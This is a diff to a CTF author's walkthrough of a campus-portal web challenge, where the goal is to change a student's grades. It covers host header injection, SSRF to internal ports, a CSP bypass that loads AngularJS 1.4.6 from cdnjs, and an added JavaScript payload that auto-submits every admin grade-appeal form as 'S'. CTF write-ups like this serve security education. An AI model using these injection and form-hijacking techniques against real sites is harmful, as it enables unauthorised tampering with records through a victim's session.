@@ -8,10 +8,12 @@ So, my girlfriend, she hates academics. She's been so lazy that this semester he
 
 grumpycat@campuslink.com:IHateC0llege123
 
-Solves: 0
+Solves: 1
 ```
 
-Ok so this one is my masterpiece and I am actually sad that no one solved it 🥲. I always wanted to make a dynamic blind challenge and I am had so much fun while creating this and learnt a lot!
+Ok so this one is my masterpiece and I am actually sad that only one solved it 🥲. Therefore congratulations to **@captain.clemo** of Team **Defragmented.Brains**
+
+I always wanted to make a dynamic blind challenge and I am had so much fun while creating this and learnt a lot!
 So basically the challenge gives you the following website. Where there is a campus portal and you are given the credentials of one of the user.
 Now your goal, as mentioned in the description is to change the grades of the user to all S grades.
 
@@ -30,7 +32,7 @@ And that gives us a redirection. What else we can do? From this point most peopl
 
 ![](screenshots/Pasted%20image%2020260201011339.png)
 
-Thats basically Host Header injection. Therefore, lets try 127.0.0.1. That gives us the same portal itself? Maybe we should change port:
+Thats basically **Host Header injection**. Therefore, lets try 127.0.0.1. That gives us the same portal itself? Maybe we should change port:
 
 ![](screenshots/Pasted%20image%2020260201011413.png)
 ![](screenshots/Pasted%20image%2020260201011425.png)
@@ -43,7 +45,7 @@ Try common ports and:
 
 ![](screenshots/Pasted%20image%2020260201012636.png)
 
-Ok, interesting finding, we got a csp:
+ahaa! interesting finding, we got a CSp:
 
 ```
 content-security-policy:
@@ -248,7 +250,24 @@ And there it is! We have some info. Lets parse it now. I have included the scrip
 
 ok so that way we know how the admin UI works. So we also know the admin updates the please on the /please/<pleaeid>. So with that info create another payload, which will submit every pleas to the endpoint:
 Logic is simple:
-Take every form, fill up the data as soon as its loaded, set status as Updated, and updated_grade as S and a random feedback of your choice and submit. This should be done fast and as soon as angular is loaded through the cloudflare such that it will execute before the admin rejects.sd
+Take every form, fill up the data as soon as its loaded, set status as Updated, and updated_grade as S and a random feedback of your choice and submit. This should be done fast and as soon as angular is loaded through the cloudflare such that it will execute before the admin rejects.
+
+```javascript
+document.querySelectorAll('form[action^="/pleas/"]').forEach((form) => {
+  const statusSelect = form.querySelector('select[name="status"]');
+  if (statusSelect) statusSelect.value = "Updated";
+
+  const gradeInput = form.querySelector('input[name="updated_grade"]');
+  if (gradeInput) gradeInput.value = "S";
+
+  const feedbackArea = form.querySelector('textarea[name="feedback"]');
+  if (feedbackArea) feedbackArea.value = "You deserved this";
+
+  form.submit();
+});
+```
+
+Now convert that to bs4 payload and:
 
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
@@ -263,3 +282,16 @@ And remember, as soon as you submit the payload submit the rest of the review re
 ![](screenshots/Pasted%20image%2020260201044136.png)
 
 ![](screenshots/Pasted%20image%2020260201044207.png)
+
+And there it is! The flag. 😭
+
+Thank you I hope you liked my chals. Lol. Though I have to say it:
+
+I saw some people finding their own 0 days on it. Like for example I havent indended for the openapi.json to be still available. I fixed /docs but didnt expect this to be. But I think the existence of it confused people 🤣 I thought it would make it easy.
+
+Same goes for the SSRF without Host header using the `@` symbol. Lol congrats to those who found it
+But you wont see the csp with that I think hehe.
+
+All the best people. See you finalists on the Final Event, and see you somewhere on some ctf, the rest of the good people.
+
+psychoSherlock 🕵️‍♂️
